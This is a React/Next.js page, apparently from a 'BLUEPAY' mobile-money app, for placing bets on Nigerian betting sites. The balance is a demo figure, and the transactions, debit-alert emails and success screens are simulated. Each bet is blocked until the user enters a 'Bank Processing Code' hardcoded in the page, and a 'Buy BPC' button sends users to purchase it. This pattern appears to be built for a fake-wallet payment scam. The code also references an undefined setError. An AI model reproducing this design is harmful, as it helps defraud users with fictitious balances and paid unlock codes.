'use client'

import React, { useState } from 'react'
import { useRouter } from 'next/navigation'
import { ChevronLeft, Check, Eye, EyeOff, AlertCircle } from 'lucide-react'
import { sendDebitAlert, generateTransactionId, getCurrentDateTime } from '@/lib/debit-alert'
import { getBalance, deductBalance, addBalance, addTransaction } from '@/lib/balance-store'

import { createClient } from '@supabase/supabase-js'

const CORRECT_BPC_CODE = 'BPC2026_PRO_V30_54D'

export default function BettingPage() {
  const router = useRouter()
  const [amount, setAmount] = useState('')
  const [selectedPlatform, setSelectedPlatform] = useState('')
  const [userBettingId, setUserBettingId] = useState('')
  const [userId, setUserId] = useState('')
  const [balance, setBalance] = useState(250000) // Demo balance
  const [bpcCode, setBpcCode] = useState('')
  const [showBpcCode, setShowBpcCode] = useState(false)
  const [loading, setLoading] = useState(false)
  const [success, setSuccess] = useState(false)
  const [bpcError, setBpcError] = useState('')
  const [fullName, setFullName] = useState('')
  const [userEmail, setUserEmail] = useState('')

  const platforms = [
    'BET9JA',
    'SPORTYBET',
    'NAIRABET',
    'BETKING',
    '1XBET',
    'MSPORT',
    'BANGBET',
    'MERRYBET',
    'SUPABET',
    'WESTERNBET',
  ]

  React.useEffect(() => {
    if (typeof window === "undefined") return
    const loadUserData = async () => {
      try {
        const supabase = createClient(
          process.env.NEXT_PUBLIC_SUPABASE_URL!,
          process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
        )
        const { data: { session } } = await supabase.auth.getSession()
        if (session?.user) {
          setUserId(session.user.id)
          setUserEmail(session.user.email || '')
          const { data: profile } = await supabase
            .from('profiles')
            .select('full_name')
            .eq('id', session.user.id)
            .single()
          if (profile?.full_name) setFullName(profile.full_name)
        }
      } catch (err) {
        setFullName(sessionStorage.getItem('signupFullName') || 'BLUEPAY User')
        setUserEmail(sessionStorage.getItem('signupEmail') || '')
      }
    }
    loadUserData()

    // Load balance from unified store and listen for changes
    setBalance(getBalance())
    const handleBalanceChange = () => setBalance(getBalance())
    window.addEventListener('balanceChange', handleBalanceChange)
    
    return () => window.removeEventListener('balanceChange', handleBalanceChange)
  }, [])

  const handleBet = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!selectedPlatform) {
      alert('Please select a betting platform')
      return
    }

    if (!userBettingId.trim()) {
      alert('Please enter your User ID')
      return
    }
    
    if (!amount) {
      alert('Please enter a bet amount')
      return
    }
    
    if (!bpcCode) {
      setBpcError('Please enter BPC CODE')
      return
    }
    
    if (bpcCode !== CORRECT_BPC_CODE) {
      setBpcError('Wrong Bank Processing Code (BPC CODE). Kindly get the correct code to proceed with the transaction.')
      return
    }

    setLoading(true)
    try {
      await new Promise(resolve => setTimeout(resolve, 1500))
      
      const betAmount = parseFloat(amount)
      const transactionId = generateTransactionId()
      
      // Send debit alert email
      await sendDebitAlert({
        email: userEmail,
        full_name: fullName,
        transaction_type: 'Betting',
        amount: betAmount,
        recipient_name: selectedPlatform,
        recipient_account_number: userBettingId,
        recipient_bank_name: 'Betting Platform',
        transaction_id: transactionId,
        transaction_date: getCurrentDateTime(),
      })

      // Update demo balance in unified store
      const newBalance = deductBalance(betAmount)
      setBalance(newBalance)

      // Add transaction to unified store
      addTransaction({
        type: 'betting',
        amount: betAmount,
        status: 'success',
        description: `Betting - ${selectedPlatform}`,
      })
      
      setSuccess(true)
      // Show success for 2 seconds then navigate to dashboard
      setTimeout(() => {
        // Dispatch events to notify dashboard of updates
        window.dispatchEvent(new Event('balanceChange'))
        window.dispatchEvent(new Event('transactionsChange'))
        // Navigate to dashboard
        router.push('/dashboard')
      }, 2000)
    } catch (error) {
      console.error('[v0] Bet error:', error)
      alert('Transaction failed. Please try again.')
    } finally {
      setLoading(false)
    }
  }

  if (success) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-blue-50 to-gray-50 flex items-center justify-center px-4">
        <div className="w-full max-w-sm text-center">
          <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
            <Check className="w-10 h-10 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-gray-900 mb-2">Bet Placed Successfully!</h1>
          
          {/* Details */}
          <div className="bg-white rounded-2xl p-4 space-y-3 text-left mb-4">
            <div className="flex justify-between">
              <span className="text-gray-600">User Name</span>
              <span className="font-bold text-gray-900">Guest User</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Transaction Date & Time</span>
              <span className="font-semibold text-gray-900 text-xs">
                {new Date().toLocaleDateString('en-US', { 
                  weekday: 'short',
                  year: 'numeric',
                  month: 'short',
                  day: 'numeric',
                  hour: '2-digit',
                  minute: '2-digit',
                  second: '2-digit'
                })}
              </span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Platform</span>
              <span className="font-semibold text-gray-900">{selectedPlatform}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-600">Bet Amount</span>
              <span className="font-bold text-gray-900">₦{parseInt(amount).toLocaleString()}</span>
            </div>
          </div>
          
          <div className="space-y-3 mt-6">
            <button
              onClick={() => router.push('/dashboard')}
              className="w-full bg-[#0000ff] text-white font-semibold py-3 rounded-xl hover:opacity-90 transition"
            >
              Back to Dashboard
            </button>
            <button
              onClick={() => {
                setSuccess(false)
                setSelectedPlatform('')
                setUserBettingId('')
                setAmount('')
                setError('')
              }}
              className="w-full bg-gray-100 text-gray-900 font-semibold py-3 rounded-xl hover:bg-gray-200 transition"
            >
              Place Another Bet
            </button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 pb-6">
      <header className="bg-white border-b">
        <div className="flex items-center gap-3 max-w-sm mx-auto px-4 py-3">
          <button onClick={() => router.back()} className="p-2 hover:bg-gray-100 rounded-lg">
            <ChevronLeft className="w-6 h-6" />
          </button>
          <h1 className="text-xl font-bold text-gray-900">Place Bet</h1>
        </div>
      </header>
      <div className="max-w-sm mx-auto px-4 pt-6">
        <form onSubmit={handleBet} className="space-y-4">
          <div>
            <label className="block text-sm font-semibold text-gray-900 mb-2">Select Betting Platform</label>
            <select
              value={selectedPlatform}
              onChange={(e) => setSelectedPlatform(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            >
              <option value="">Choose platform</option>
              {platforms.map((platform) => (
                <option key={platform} value={platform}>{platform}</option>
              ))}
            </select>
          </div>

          <div>
            <label className="block text-sm font-semibold text-gray-900 mb-2">Your User ID</label>
            <input
              type="text"
              value={userBettingId}
              onChange={(e) => setUserBettingId(e.target.value)}
              placeholder="Enter your betting platform User ID"
              className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            />
          </div>

          <div>
            <label className="block text-sm font-semibold text-gray-900 mb-2">Bet Amount (₦)</label>
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="Enter bet amount"
              className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
              min="100"
            />
          </div>

          {/* BPC CODE Input */}
          <div>
            <label className="block text-sm font-semibold text-gray-900 mb-3">
              INPUT BPC CODE
            </label>
            <div className="relative">
              <input
                type={showBpcCode ? 'text' : 'password'}
                value={bpcCode}
                onChange={(e) => {
                  setBpcCode(e.target.value)
                  setBpcError('')
                }}
                placeholder="Enter BPC Code"
                className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] pr-10"
                maxLength={CORRECT_BPC_CODE.length}
              />
              <button
                type="button"
                onClick={() => setShowBpcCode(!showBpcCode)}
                className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
              >
                {showBpcCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
            <button
              type="button"
              onClick={() => router.push('/buy-bpc')}
              className="text-[#0000ff] hover:text-blue-700 text-sm font-semibold mt-2"
            >
              Buy BPC
            </button>
          </div>

          {bpcError && (
            <div className="flex gap-3 p-4 bg-red-50 border border-red-200 rounded-xl">
              <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
              <p className="text-sm text-red-700">{bpcError}</p>
            </div>
          )}

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#0000ff] text-white font-bold py-3 rounded-xl hover:opacity-90 transition disabled:opacity-50 mt-3"
          >
            {loading ? 'Processing...' : 'Place Bet'}
          </button>
        </form>
      </div>
    </div>
  )
}
